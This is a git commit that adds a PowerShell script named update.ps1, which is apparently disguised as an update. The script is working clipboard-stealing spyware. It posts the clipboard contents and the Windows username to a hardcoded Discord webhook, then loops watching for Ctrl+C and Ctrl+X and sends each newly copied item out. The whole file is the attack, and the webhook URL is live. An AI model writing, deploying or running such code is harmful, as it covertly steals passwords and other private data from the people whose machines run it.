8c91895789b8ec48c956bb5ba5f8110bce4d7d88
FBakri <93790223+offport@users.noreply.github.com>
2023-02-05 07:26:35 -0800

    Create update.ps1

---
+++ update.ps1
@@ -0,0 +1,36 @@
+Add-Type -AssemblyName WindowsBase
+Add-Type -AssemblyName PresentationCore
+
+function dischat {
+
+  [CmdletBinding()]
+  param (    
+  [Parameter (Position=0,Mandatory = $True)]
+  [string]$con
+  ) 
+  
+  $hookUrl = 'https://discord.com/api/webhooks/1071802496269418517/WbvHLqyZuhgX-6gzLRGTS68OIiXVlyoVQoXwER-O9eHrrfdwq3PCX608wSCFTsBPlkVt'
+  
+$Body = @{
+  'username' = $env:username
+  'content' = $con
+}
+
+
+Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
+
+}
+
+
+dischat (get-clipboard)
+
+while (1){
+    $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
+    $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
+    $cKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::c)
+    $xKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::x)
+
+       if (($Lctrl -or $Rctrl) -and ($xKey -or $cKey)) {dischat (Get-Clipboard)}
+       elseif ($Rctrl -and $Lctrl) {dischat "---------connection lost----------";exit}
+       else {continue}
+} 
